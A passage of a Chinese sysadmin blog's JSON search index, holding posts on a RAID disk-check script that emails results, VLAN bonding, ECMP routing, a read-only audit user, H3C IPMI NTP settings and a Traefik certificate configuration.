class=\"nv\"\u003e$j\u003c/span\u003e\u003cspan class=\"s2\"\u003e......\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /tmp/idrac.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   sshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@172.18.\u003cspan class=\"nv\"\u003e$j\u003c/span\u003e /opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep \u003cspan class=\"s2\"\u003e\u0026#34;S.M.A.R.T\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /tmp/idrac.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003elines\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003egrep -n \u003cspan class=\"s2\"\u003e\u0026#34;Yes\u0026#34;\u003c/span\u003e  /tmp/idrac.txt \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -f1 -d:\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"si\"\u003e${#\u003c/span\u003e\u003cspan class=\"nv\"\u003elines\u003c/span\u003e\u003cspan class=\"p\"\u003e[@]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e -eq \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003efor\u003c/span\u003e findline in \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003elines\u003c/span\u003e\u003cspan class=\"p\"\u003e[@]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003earray\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003egrep -n \u003cspan class=\"s2\"\u003e\u0026#34;\\.\\.\\.\\.\\.\\.\u0026#34;\u003c/span\u003e  /tmp/idrac.txt \u003cspan class=\"p\"\u003e|\u003c/span\u003ecut -f1 -d:\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003enewarray\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e[*]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003efindline\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003esortarray\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003enewarray\u003c/span\u003e\u003cspan class=\"p\"\u003e[@]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e tr \u003cspan class=\"s1\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003esort -n\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"o\"\u003e((\u003c/span\u003e\u003cspan class=\"nv\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\u003cspan class=\"p\"\u003e;\u003c/span\u003ei\u0026lt;\u003cspan class=\"si\"\u003e${#\u003c/span\u003e\u003cspan class=\"nv\"\u003esortarray\u003c/span\u003e\u003cspan class=\"p\"\u003e[*]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003ei++\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003esortarray\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e -eq \u003cspan class=\"nv\"\u003e$findline\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ebeginline\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003esortarray\u003c/span\u003e\u003cspan class=\"p\"\u003e[((\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"p\"\u003e-1))]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eendline\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003esortarray\u003c/span\u003e\u003cspan class=\"p\"\u003e[((\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"p\"\u003e+1))]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$endline\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"nv\"\u003eendline\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e$\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"nv\"\u003eendline\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$((\u003c/span\u003e\u003cspan class=\"nv\"\u003e$endline\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\u003cspan class=\"k\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    sed -n \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$beginline\u003c/span\u003e\u003cspan class=\"s2\"\u003e,\u003c/span\u003e\u003cspan class=\"nv\"\u003e$endline\u003c/span\u003e\u003cspan class=\"s2\"\u003e p\u0026#34;\u003c/span\u003e /tmp/idrac.txt \u0026gt;\u0026gt; /tmp/idracout.txt \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003edone\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  /usr/local/bin/mailsend -to \u003cspan class=\"s2\"\u003e\u0026#34;zhangranrui@ddky.com\u0026#34;\u003c/span\u003e -from monit@ddky.com -ssl -port \u003cspan class=\"m\"\u003e465\u003c/span\u003e -auth -auth-plan -smtp smtp.exmail.qq.com -sub \u003cspan class=\"s2\"\u003e\u0026#34;IDC机器硬件故障\u0026#34;\u003c/span\u003e -v -user \u003cspan class=\"s2\"\u003e\u0026#34;monit@ddky.com\u0026#34;\u003c/span\u003e -pass \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e -cs \u003cspan class=\"s2\"\u003e\u0026#34;gb2312\u0026#34;\u003c/span\u003e -enc-type \u003cspan class=\"s2\"\u003e\u0026#34;base64\u0026#34;\u003c/span\u003e -M \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ecat /tmp/idracout.txt\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Linux下定期检查物理机磁盘的脚本"},{"content":"我们的宿主机上做了4网卡bonding，然后需要上升到br，两个网卡都需要做上vlan。\n比如172.18.30.1，想在上面增加一个VLAN段202，然后在上面生产一台虚机172.18.19.2\n就需要增加一个bond0.202以及br0.202\n做法如下:\ncd /etc/sysconfig/network-scripts cp ifcfg-bond0.199 ifcfg-bond0.202 vi ifcfg-bond0.202 DEVICE=bond0.202 ONBOOT=yes USERCTL=no BRIDGE=br0.202 VLAN=yes cp ifcfg-br0.199 ifcfg-br0.199 vi ifcfg-br0.202 DEVICE=br0.202 BOOTPROTO=static ONBOOT=yes TYPE=Bridge 然后启动这两个网卡，启动顺序很重要！！！\nifup bond0.202 ifup br0.202 注意，执行完以后务必检查一下两个网卡是否UP\n然后产虚机就好\n./vm.sh create -b br0.202 -c 4 -m 4096 -d 40 -i 172.18.19.2 -k 255.255.255.0 -g 172.18.19.254 -q 172.18.30.1 -r 172.18.30.2 ucarp-18-19-2 ","permalink":"https://rendoumi.com/posts/20231227-vlan_bond_br/","summary":"\u003cp\u003e我们的宿主机上做了4网卡bonding，然后需要上升到br，两个网卡都需要做上vlan。\u003c/p\u003e\n\u003cp\u003e比如172.18.30.1，想在上面增加一个VLAN段202，然后在上面生产一台虚机172.18.19.2\u003c/p\u003e\n\u003cp\u003e就需要增加一个bond0.202以及br0.202\u003c/p\u003e\n\u003cp\u003e做法如下:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /etc/sysconfig/network-scripts\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp ifcfg-bond0.199 ifcfg-bond0.202\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi ifcfg-bond0.202\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebond0.202\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUSERCTL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBRIDGE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0.202\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eVLAN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp ifcfg-br0.199 ifcfg-br0.199\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi ifcfg-br0.202\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0.202\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBOOTPROTO\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003estatic\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eBridge\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后启动这两个网卡，启动顺序很重要！！！\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifup bond0.202\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifup br0.202\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意，执行完以后务必检查一下两个网卡是否UP\u003c/p\u003e\n\u003cp\u003e然后产虚机就好\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./vm.sh create -b br0.202 -c \u003cspan class=\"m\"\u003e4\u003c/span\u003e -m \u003cspan class=\"m\"\u003e4096\u003c/span\u003e -d \u003cspan class=\"m\"\u003e40\u003c/span\u003e  -i 172.18.19.2 -k 255.255.255.0 -g 172.18.19.254 -q 172.18.30.1 -r 172.18.30.2 ucarp-18-19-2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Linux下bond和br建立vlan的方法"},{"content":"我们有两个出口，一个从无锡出，一个从世纪互联出\n这台机器的em1接世纪互联，em2接无锡尚航，两个网关，有ipv6和ipv4\nISP 1:\rGateways:\r172.16.9.254\r2001:db8:a::1\rInterface: em1\rISP 2:\rGateways:\r172.18.9.254\r2001:db8:b::1\rInterface: em2\r那么这台机器的ECMP等价路由这么做：\nip route replace default proto static scope global \\\rnexthop dev em1 via 172.16.9.254 weight 1 \\\rnexthop dev em2 via 172.18.9.254 weight 1\rip -6 route replace default proto static scope global \\\rnexthop dev em1 via 2001:db8:a::1 weight 1 \\\rnexthop dev em2 via 2001:db8:b::1 weight 1\r这两条命令需要放到 /etc/rc.d/rc.locl 或者ifup里面去\n之后发包的时候就会一左一右轮流发。\n","permalink":"https://rendoumi.com/posts/20231227-linux_ecmp/","summary":"\u003cp\u003e我们有两个出口，一个从无锡出，一个从世纪互联出\u003c/p\u003e\n\u003cp\u003e这台机器的em1接世纪互联，em2接无锡尚航，两个网关，有ipv6和ipv4\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eISP 1:\r\n    Gateways:\r\n        172.16.9.254\r\n        2001:db8:a::1\r\n    Interface: em1\r\n\t\r\nISP 2:\r\n    Gateways:\r\n        172.18.9.254\r\n        2001:db8:b::1\r\n    Interface: em2\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么这台机器的ECMP等价路由这么做：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eip route replace default proto static scope global \\\r\n    nexthop dev em1 via 172.16.9.254 weight 1 \\\r\n    nexthop dev em2 via 172.18.9.254 weight 1\r\n\r\nip -6 route replace default proto static scope global \\\r\n    nexthop dev em1 via 2001:db8:a::1 weight 1 \\\r\n    nexthop dev em2 via 2001:db8:b::1 weight 1\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这两条命令需要放到 /etc/rc.d/rc.locl 或者ifup里面去\u003c/p\u003e","title":"Linux下ECMP等价路由的建立"},{"content":"审计的要求：\n线上环境研发只能有只读权限\n那只能曲线救国了，两个用户，supdev是运维用来管理的，logview是研发用来只读日志的\n一、首先确定系统有supdev用户存在 id supdev 通常supdev的id是511\n二、增加新用户logview 我们确定logview的id是512，group是和supdev同组 useradd -u 512 -g supdev logview\n三、程序的app以及数据目录不是在supdev的home目录下，而是在/data/servers下 所以我们把/data/servers下的目录都改成750，文件都改成640\n#!/bin/sh\rfind /export/servers/ -type d ! -perm 0750 -exec chmod 0750 {}\rfind /export/servers/ -type f ! -perm 0640 -exec chmod 0640 {} # ansible 模块\r- name: make dirs 0755\rcommand: find {{ your_path }} -type d ! -perm 0750 -exec chmod 0750 {} \\;\r- name: make files 0644\rcommand: find {{ your_path }} -type f ! -perm 0640 -exec chmod 0640 {} \\; 这样就可以了。logview可以去到/data/servers目录，可以看文件，但无法执行。\n","permalink":"https://rendoumi.com/posts/20231227-supdev_logview/","summary":"\u003cp\u003e审计的要求：\u003c/p\u003e\n\u003cp\u003e线上环境研发只能有只读权限\u003c/p\u003e\n\u003cp\u003e那只能曲线救国了，两个用户，supdev是运维用来管理的，logview是研发用来只读日志的\u003c/p\u003e\n\u003ch3 id=\"一首先确定系统有supdev用户存在\"\u003e一、首先确定系统有supdev用户存在\u003c/h3\u003e\n\u003cp\u003eid supdev\n通常supdev的id是511\u003c/p\u003e\n\u003ch3 id=\"二增加新用户logview\"\u003e二、增加新用户logview\u003c/h3\u003e\n\u003cp\u003e我们确定logview的id是512，group是和supdev同组\nuseradd -u 512 -g supdev logview\u003c/p\u003e\n\u003ch3 id=\"三程序的app以及数据目录不是在supdev的home目录下而是在dataservers下\"\u003e三、程序的app以及数据目录不是在supdev的home目录下，而是在/data/servers下\u003c/h3\u003e\n\u003cp\u003e所以我们把/data/servers下的目录都改成750，文件都改成640\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e#!/bin/sh\r\nfind /export/servers/ -type d ! -perm 0750 -exec chmod 0750 {}\r\nfind /export/servers/ -type f ! -perm 0640 -exec chmod 0640 {}\n\u003c/code\u003e\u003c/pre\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# ansible 模块\r\n- name: make dirs 0755\r\n  command: find {{ your_path }} -type d ! -perm 0750 -exec chmod 0750 {} \\;\r\n\r\n- name: make files 0644\r\n  command: find {{ your_path }} -type f ! -perm 0640 -exec chmod 0640 {} \\;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样就可以了。logview可以去到/data/servers目录，可以看文件，但无法执行。\u003c/p\u003e","title":"审计需求只读用户的建立"},{"content":"H3C服务器主板时间不准确也很讨厌，看主板日志时间都是错的，没办法，修改一下。\nH3C服务器BIOS的NTP设置方法：\n修改主服务器：\nipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x01 服务器名的HEX字符串 修改辅服务器：\nipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x02 服务器名的HEX字符串 修改第三个服务器：\nipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x05 服务器名的HEX字符串 方法很简单，但是服务器名的HEX字符串如何得到？\necho -n \u0026#34;172.18.30.1\u0026#34; | od -A n -t x1 | sed \u0026#34;s/ / 0x/g\u0026#34;\r0x31 0x37 0x32 0x2e 0x31 0x38 0x2e 0x33 0x30 0x2e 0x31 修改NTP服务器1为172.18.30.1\nipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x01 0x31 0x37 0x32 0x2e 0x31 0x38 0x2e 0x33 0x30 0x2e 0x31 ","permalink":"https://rendoumi.com/posts/20231226-h3c_ntp/","summary":"\u003cp\u003eH3C服务器主板时间不准确也很讨厌，看主板日志时间都是错的，没办法，修改一下。\u003c/p\u003e\n\u003cp\u003eH3C服务器BIOS的NTP设置方法：\u003c/p\u003e\n\u003cp\u003e修改主服务器：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x01 服务器名的HEX字符串\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e修改辅服务器：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x02 服务器名的HEX字符串\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e修改第三个服务器：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x05 服务器名的HEX字符串\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e方法很简单，但是服务器名的HEX字符串如何得到？\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eecho -n \u0026#34;172.18.30.1\u0026#34; | od -A n -t x1 | sed  \u0026#34;s/ / 0x/g\u0026#34;\r\n0x31 0x37 0x32 0x2e 0x31 0x38 0x2e 0x33 0x30 0x2e 0x31\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e修改NTP服务器1为172.18.30.1\u003c/p\u003e","title":"H3C服务的BIOS主板设置中如何正确设置NTP服务器"},{"content":"traefik使用digicert付费的证书和使用letencrypt免费证书的方法不一样，下面说一下怎么配置：\ntraefik.yml里面就没有任何配置\nlog: level: DEBUG api: insecure: false dashboard: true entryPoints: http: address: \u0026#34;:80\u0026#34; #http: # redirections: # entryPoint: # to: https # scheme: https https: address: \u0026#34;:443\u0026#34; providers: file: directory: /export/servers/traefik/dynamic watch: true 所有的配置都放到到/export/servers/traefik/dynamic目录下了，动态更新：\ncerts.yml来定义证书选项\ntls: certificates: - certFile: \u0026#34;/export/servers/traefik/ddky.crt\u0026#34; keyFile: \u0026#34;/export/servers/traefik/ddky.key\u0026#34; options: default: sniStrict: true minVersion: VersionTLS12 cipherSuites: - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 - TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256 - TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 - TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 test7-01.yml单独test7.ddky.com的配置\nhttp: routers: https_01: rule: \u0026#34;Host(`test7.ddky.com`)\u0026#34; service: svc_01 tls: domains: - main: \u0026#34;test7.ddky.com\u0026#34; sans: - \u0026#34;*.ddky.com\u0026#34; http_01: rule: \u0026#34;Host(`test7.ddky.com`)\u0026#34; service: svc_01 entryPoints: - http services: svc_01: loadBalancer: servers: test8-02.yml单独test8.ddky.com的配置\nhttp: routers: https_02: rule: \u0026#34;Host(`test8.ddky.com`)\u0026#34; service: svc_02 tls: domains: - main: \u0026#34;test8.ddky.com\u0026#34; http_02: rule: \u0026#34;Host(`test8.ddky.com`)\u0026#34; service: svc_02 entryPoints: - http services: svc_02: loadBalancer: servers: - url: \u0026#34;http://172.18.31.33:80\u0026#34; 注意上面tls的选项，sans备用域名可加可不加。\n","permalink":"https://rendoumi.com/posts/20231221-traefik_digicert/","summary":"\u003cp\u003etraefik使用digicert付费的证书和使用letencrypt免费证书的方法不一样，下面说一下怎么配置：\u003c/p\u003e\n\u003cp\u003etraefik.yml里面就没有任何配置\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan 